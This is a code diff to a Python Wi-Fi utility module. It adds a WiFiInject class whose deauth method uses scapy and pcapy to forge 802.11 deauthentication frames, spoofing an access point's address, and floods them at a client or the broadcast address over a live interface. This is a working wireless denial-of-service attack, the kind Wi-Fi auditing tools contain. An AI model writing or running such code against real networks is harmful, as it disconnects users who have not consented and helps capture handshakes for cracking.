@@ -4,8 +4,9 @@ import os
 import subprocess
 import re
 import time
+import pcapy
 
-from scapy.all import Dot11Beacon, Dot11Elt, RadioTap
+from scapy.all import Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth, Dot11
 
 class WiFi_Parser:
 	def __init__(self, pkt):
@@ -382,3 +383,19 @@ class WiFiPhyManager:
 				if not 'No IR' in channel_data:
 					channels.append(match.group(2))
 		return channels
+
+class WiFiInject:
+	def __init__(self, interface, bssid=None, client=None):
+		self.interface = interface
+		self.bssid = bssid
+		self.client = client if not client is None else 'ff:ff:ff:ff:ff:ff'
+
+	def deauth(self, reason_code=3, attempts=3, packets=127, timeout=1, callback=None):
+		pcap = pcapy.open_live(self.interface, 100, 1, 9)
+		for attempt in range(attempts):
+			if callback and callable(callback):
+				callback(attempt +1, attempts, self.bssid, self.client, reason_code)
+			for seq_num in range(packets):
+				deauth_pkt = bytes(RadioTap() / Dot11(addr1=self.client, addr2=self.bssid, addr3=self.bssid, SC=(seq_num << 4)) / Dot11Deauth(reason=reason_code))
+				pcap.sendpacket(deauth_pkt)
+			time.sleep(timeout)
